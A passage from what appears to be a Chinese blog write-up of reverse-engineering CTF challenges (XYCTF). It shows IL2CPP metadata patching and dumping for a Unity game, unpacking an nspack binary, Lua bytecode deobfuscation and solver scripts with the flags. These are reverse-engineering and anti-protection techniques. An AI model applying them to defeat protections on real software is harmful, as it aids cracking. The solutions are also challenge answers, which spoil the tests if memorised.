class="template-variable">&#123;IL2CPP_1s_intere5t1ng&#125;</span></span><br></pre></td></tr></table></figure><p>原理大概是这样：</p><p>unity的游戏输出有两种一种是mono的c#（一般逆的），这种一般在managed文件夹里有Assembly-CShap.dll文件，然后这个东西可以直接被dnspy之类的直接反编译。这次这种叫li2cpp（中间代码 to cpp）,通过失去动态编译特性来换取cpp的多平台，速度快等优势，对逆向来说：最恶心的就是文件变成了GameAssembly.dll，这是个PE文件（在移动端是so文件），也就是说符号表完全不必要有，这样就不好逆了（如果有佬可以直接逆的话，只能说NB），不过这个文件也没有常量表之类的东西所以肯定在一个地方存了它的数据来读入。</p><p>根据检索网络得知：符号表位于\il2cpp_data\Metadata\global-metadata.dat</p><p>现在的目的就是把这个文件导入进去了。</p><p>有一个工具叫做licppdumper可以做到这一点：</p><p>下载后双击exe，提示选择li2cpp二进制文件，选择GameAssembly.dll，又提示选择dat文件选择dat文件（baby那道题可以直接导入，ez那道题做了加密）</p><p>发现导入不了，去010看看结构：</p><p><img src="https://s2.loli.net/2024/04/06/cElIVup7XRNadnD.png" alt="错误的结构"></p><p><img src="https://s2.loli.net/2024/04/06/DjiS8cWGAzyf3U5.png" alt="正常的结构"></p><p>把第一排改成AF 1B B1 FA 1D 00 00 00 00 01 00 00，删几个字符，让后面接着C0 B2</p><p>然后把下面的内容对齐</p><p>直接dumper导入，导入成功！</p><p>然后打开ida，导入脚本文件，然后选择刚刚用dumper生成的两个json文件：</p><p>script.json和stringliteral.json文件，两个选择完之后,符号表就恢复了，然后在ida里面直接找加密函数，应该很好看，一个是RC4，一个是AES直接放到在线网站上解就好了，其中用到的数被还原成注释了，不要看错了QAQ</p><h3 id="week2">week2</h3><h4 id="ez-cube">ez_cube</h4><p>用ida反编译分析，找到打乱方式</p><p><img src="https://s2.loli.net/2024/04/09/21wu6gCdpSfPxc5.png" alt="image-20240409183514183"></p><p>百度搜索cfop pll可得公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R <span class="string">U&#x27; R U R U R U&#x27;</span> <span class="string">R&#x27; U&#x27;</span> R2</span><br><span class="line">flag&#123;RuRURURuruRR&#125;</span><br></pre></td></tr></table></figure><h4 id="ez-rand">ez_rand</h4><p>这个题就是考rand函数在不同环境下效果不同这个知识点，刚好我一开始就用的cpp，直接写脚本爆破出rand然后用就好了，还有注意传入初始化的值在al寄存器里面，所以要&amp;0xffff</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> tstart = <span class="number">1640966400</span>;</span><br><span class="line">    <span class="type">long</span> tlast = <span class="number">1735660800</span>;</span><br><span class="line">    <span class="type">long</span> time = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">29</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;<span class="comment">/*&quot;XYCTF&#123;&quot;;*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">29</span>] = &#123;</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x46</span>, <span class="number">0x19</span>, <span class="number">0xFC</span>, <span class="number">0x34</span>, <span class="number">0xB2</span>, <span class="number">0x62</span>, <span class="number">0x23</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0xFB</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>, <span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0xE9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//for (time = tstart; time &lt;= tlast; time++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    srand(time &amp; 0xffff);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    int f = 0;</span></span><br><span class="line">    <span class="comment">//    for (int i = 0; i &lt; 6; i++)</span></span><br><span class="line">    <span class="comment">//    &#123;</span></span><br><span class="line">    <span class="comment">//        int num = rand();</span></span><br><span class="line">    <span class="comment">//        if ((flag[i] ^ (unsigned __int8)(num + ((((unsigned __int64)(2155905153 * num) &gt;&gt; 32) &amp; 0x80000000) != 0) + ((int)((unsigned __int64)(2155905153 * num) &gt;&gt; 32) &gt;&gt; 7))) == data[i])</span></span><br><span class="line">    <span class="comment">//        &#123;</span></span><br><span class="line">    <span class="comment">//            f++;</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//        if (f &gt;= 6)</span></span><br><span class="line">    <span class="comment">//        &#123;</span></span><br><span class="line">    <span class="comment">//            printf(&quot;%d  &quot;, time &amp; 0xffff);</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//    //std::cout &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    time = <span class="number">21308</span>;</span><br><span class="line">    <span class="built_in">srand</span>(time);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> num = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> x = (<span class="type">unsigned</span> __int8)(num + ((((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * num) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>) + ((<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * num) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">7</span>));</span><br><span class="line">        flag[i] = data[i] ^ x;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//XYCTF&#123;R@nd_1s_S0_S0_S0_easy!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="今夕是何年">今夕是何年</h4><p>架构题，是龙芯架构，配好虚拟机，然后直接输出</p><p><img src="https://s2.loli.net/2024/04/09/dmL7viqNCcRYBZI.png" alt="image-20240409185205541"></p><h4 id="何须相思煮余年">何须相思煮余年</h4><p>居然是一个txt文件，开头是push ebp，那没事了，直接ida32打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">88</span>,<span class="number">88</span>,<span class="number">134</span>,<span class="number">87</span>,<span class="number">74</span>,<span class="number">118</span>,<span class="number">318</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">92</span>,<span class="number">480</span>,<span class="number">60</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">770</span>,<span class="number">110</span>,<span class="number">73</span>,<span class="number">31</span>,<span class="number">918</span>,<span class="number">39</span>,<span class="number">120</span>,<span class="number">27</span>,<span class="number">1188</span>,<span class="number">47</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">1352</span>,<span class="number">44</span>,<span class="number">81</span>,<span class="number">23</span>,<span class="number">1680</span>,<span class="number">46</span>,<span class="number">85</span>,<span class="number">15</span>,<span class="number">1870</span>,<span class="number">66</span>,<span class="number">91</span>,<span class="number">16</span>,<span class="number">4750</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">4</span>==<span class="number">0</span>):</span><br><span class="line">        enc[i]-=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">1</span>):</span><br><span class="line">        enc[i]+=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">2</span>):</span><br><span class="line">        enc[i]//=i</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">4</span>==<span class="number">3</span>):</span><br><span class="line">        enc[i]^=i</span><br><span class="line">pl(enc)</span><br><span class="line"><span class="comment"># XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;</span></span><br></pre></td></tr></table></figure><h4 id="砸核桃">砸核桃</h4><p>查一下壳是nspack，直接找个工具脱了</p><p>然后打开。又是很简单的逻辑,直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = <span class="string">&#x27;this_is_not_flag&#x27;</span></span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>, <span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line">pxor(last,k)</span><br><span class="line"><span class="comment"># flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h3 id="week3">week3</h3><h4 id="ez-enc">ez_enc</h4><p>打开main，是一个简单的带mod的加密，既然是前一个数据和后一个数据有关系，还不大，直接z3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;IMouto&#x27;</span></span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x27</span>, <span class="number">0x24</span>, <span class="number">0x17</span>, <span class="number">0x0B</span>, <span class="number">0x50</span>, <span class="number">0x03</span>, <span class="number">0xC8</span>, <span class="number">0x0C</span>, </span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0x55</span>, <span class="number">0xCB</span>, <span class="number">0x2D</span>, <span class="number">0xE9</span>, <span class="number">0x32</span>, </span><br><span class="line">        <span class="number">0x0E</span>, <span class="number">0x11</span>, <span class="number">0x26</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x07</span>, <span class="number">0xFC</span>, <span class="number">0x27</span>, </span><br><span class="line">        <span class="number">0x3D</span>, <span class="number">0x2D</span>, <span class="number">0xED</span>, <span class="number">0x35</span>, <span class="number">0x59</span>, <span class="number">0xEB</span>, <span class="number">0x3C</span>, <span class="number">0x3E</span>, </span><br><span class="line">        <span class="number">0xE4</span>, <span class="number">0x7D</span>]</span><br><span class="line"></span><br><span class="line">out,flag = zini(<span class="number">34</span>)</span><br><span class="line">f = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    f.add(last[i]==(<span class="built_in">ord</span>(key[i%<span class="number">6</span>])^out[i+<span class="number">1</span>]+out[i] % <span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">isflag(f,flag)</span><br><span class="line">zcheck(f,flag)</span><br><span class="line"><span class="comment"># flag&#123;!_r3ea11y_w4nt_@_cu7e_s1$ter&#125;</span></span><br></pre></td></tr></table></figure><h4 id="what’s-this">what’s this</h4><p>是lua的字节码，放到在线解码里面解码，接出来就是正常的lua代码，</p><p>前面是一堆混淆的函数，最后是真的代码，大概是这个</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Xor</span><span class="params">(num1, num2)</span></span></span><br><span class="line">  <span class="keyword">local</span> tmp1 = num1</span><br><span class="line">  <span class="keyword">local</span> tmp2 = num2</span><br><span class="line">  <span class="keyword">local</span> str = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">repeat</span></span><br><span class="line">    <span class="keyword">local</span> s1 = tmp1 % <span class="number">2</span></span><br><span class="line">    <span class="keyword">local</span> s2 = tmp2 % <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> s1 == s2 <span class="keyword">then</span></span><br><span class="line">      str = <span class="string">&quot;0&quot;</span> .. str</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      str = <span class="string">&quot;1&quot;</span> .. str</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    tmp1 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp1 / <span class="number">2</span>)</span><br><span class="line">    tmp2 = <span class="built_in">math</span>.<span class="built_in">modf</span>(tmp2 / <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">until</span> tmp1 == <span class="number">0</span> <span class="keyword">and</span> tmp2 == <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">tonumber</span>(str, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">output</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">local</span> temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(flag, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(Xor(temp, <span class="number">8</span>) % <span class="number">256</span>)</span><br><span class="line">  value = value .. temp</span><br><span class="line">  i = i + <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> i &gt; <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">1000</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">3</span></span><br><span class="line">  y = x * <span class="number">3</span></span><br><span class="line">  z = y / <span class="number">4</span></span><br><span class="line">  w = z - <span class="number">5</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(value, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp + <span class="number">3</span>)</span><br><span class="line">  <span class="built_in">output</span> = <span class="built_in">output</span> .. temp</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">result = <span class="built_in">output</span>:<span class="built_in">rep</span>(<span class="number">10</span>)</span><br><span class="line">invalid_list = &#123;</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">  <span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">20</span> <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(invalid_list, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">50</span> <span class="keyword">do</span></span><br><span class="line">  result = result .. <span class="string">&quot;A&quot;</span></span><br><span class="line">  <span class="built_in">table</span>.<span class="built_in">insert</span>(invalid_list, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(<span class="built_in">output</span>) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(<span class="built_in">output</span>, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">30</span> <span class="keyword">do</span></span><br><span class="line">  result = result .. <span class="built_in">string</span>.<span class="built_in">lower</span>(<span class="built_in">output</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">950</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">3</span></span><br><span class="line">  y = x * <span class="number">3</span></span><br><span class="line">  z = y / <span class="number">4</span></span><br><span class="line">  w = z - <span class="number">5</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">for</span> _ = <span class="number">1</span>, <span class="number">50</span> <span class="keyword">do</span></span><br><span class="line">  x = <span class="number">-1</span></span><br><span class="line">  y = x * <span class="number">4</span></span><br><span class="line">  z = y / <span class="number">2</span></span><br><span class="line">  w = z - <span class="number">3</span></span><br><span class="line">  <span class="keyword">if</span> w == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This line will also never be executed&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">obfuscated_output = to_base64(<span class="built_in">output</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">reverse</span>(obfuscated_output)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">invalid_variable = obfuscated_output:<span class="built_in">rep</span>(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> obfuscated_output == <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span> <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;You get the flag.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;F**k!&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下是base64加换字加一些奇怪的加密，那丢给chatgpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Xor</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 ^ num2</span><br><span class="line"></span><br><span class="line">obfuscated_output = <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span></span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;g&quot;</span>).replace(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;H&quot;</span>).replace(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;W&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line">output = base64.b64decode(obfuscated_output).decode()</span><br><span class="line"></span><br><span class="line">value = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> output:</span><br><span class="line">    temp = <span class="built_in">ord</span>(char) - <span class="number">3</span></span><br><span class="line">    value += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> value:</span><br><span class="line">    temp = Xor(<span class="built_in">ord</span>(char), <span class="number">8</span>) % <span class="number">256</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ez-math">ez_math</h4><p>是python的混淆，还没有工具，用美化工具美化一下，还是可以理解，大概就是把a*b sum了一下，最后再化简一手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">32</span> <span class="keyword">and</span> (</span><br><span class="line">    (flag[<span class="number">0</span>] * (flag[<span class="number">0</span>] - <span class="number">176</span>)) +</span><br><span class="line">    (flag[<span class="number">1</span>] * (flag[<span class="number">1</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">2</span>] * (flag[<span class="number">2</span>] - <span class="number">134</span>)) +</span><br><span class="line">    (flag[<span class="number">3</span>] * (flag[<span class="number">3</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">4</span>] * (flag[<span class="number">4</span>] - <span class="number">140</span>)) +</span><br><span class="line">    (flag[<span class="number">5</span>] * 